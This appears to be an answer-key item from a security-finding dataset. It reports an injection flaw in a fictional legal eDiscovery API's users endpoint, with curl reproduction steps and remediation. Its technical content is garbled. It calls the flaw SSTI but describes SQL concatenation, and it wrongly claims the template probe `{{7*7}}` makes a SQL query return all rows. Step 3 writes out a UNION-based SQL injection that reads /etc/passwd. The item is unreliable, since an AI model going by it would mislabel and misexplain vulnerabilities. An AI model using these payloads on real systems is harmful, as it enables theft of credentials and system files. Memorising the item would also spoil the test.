# Expected Response

## System
- Domain: Legal Tech / Document Management
- System: LexVault eDiscovery API
- Example ID: INJ-0974
- Vulnerability: SSTI

## Priority Findings

### Finding 1: SSTI on `/api/v1/users`
**Severity:** Critical
**Category:** Injection (from data/knowledge/injections)

**Summary:**
The `/api/v1/users` endpoint accepts a `search` query parameter that is directly
interpolated into a raw database query without sanitization. This enables SSTI (SSTI),
allowing an attacker to bypass authentication, extract all records, or execute arbitrary operations.

**Evidence from HAR:**
- Endpoint: `GET /api/v1/users?search={{7*7}}`
- Response: HTTP 200 with **all records returned** including password hashes and admin accounts
- The query constructed: `SELECT * FROM users WHERE search = '{{7*7}}'`
  evaluates to true for all rows when the payload is `{{7*7}}`

**Root Cause:**
- Raw string concatenation used to build database query
- No parameterized query / prepared statement
- Application DB account has excessive privileges (`db_owner`)

## Steps to Reproduce

### Step 1 — Normal request (baseline)
```bash
curl -s "https://api.lexvault-edisco.example.com/api/v1/users?search=normalvalue" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```
Expected: Returns matching records only.

### Step 2 — Inject SSTI payload
```bash
curl -s "https://api.lexvault-edisco.example.com/api/v1/users?search={{7*7}}" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```
**Vulnerable outcome:** All rows returned, including admin password hashes.
**Secure outcome:** 400 Bad Request / 0 results / sanitized error message.

### Step 3 — Privilege escalation (if DB over-privileged)
```bash
# SQLi variant: attempt to read OS-level files (if DB runs as LocalSystem)
curl -s "https://api.example.com/api/v1/users?search=' UNION SELECT null,null,load_file('/etc/passwd')--" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```

### Step 4 — Verbose error confirmation
```bash
curl -s "https://api.example.com/api/v1/users?search='" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```
**Expected verbose error (if misconfigured):** SQL syntax error message leaking table name, column names, or DB version.

## Secure Outcome
```json
{ "error": "Invalid input", "code": 400 }
```

## Remediation
1. **Use parameterized queries / prepared statements everywhere:** Replace string concatenation with `?` or named parameters.
2. **Restrict DB account privileges:** Application account should only have SELECT/INSERT/UPDATE/DELETE on required tables.
3. **Disable verbose error messages in production:** Return generic 500/400 errors without DB details.
4. **Deploy input validation middleware:** Reject inputs containing SQL metacharacters (`'`, `"`, `;`, `--`, `/*`).
5. **ORM audit:** Review all `raw()` or native query calls in ORM usage; apply parameterization.
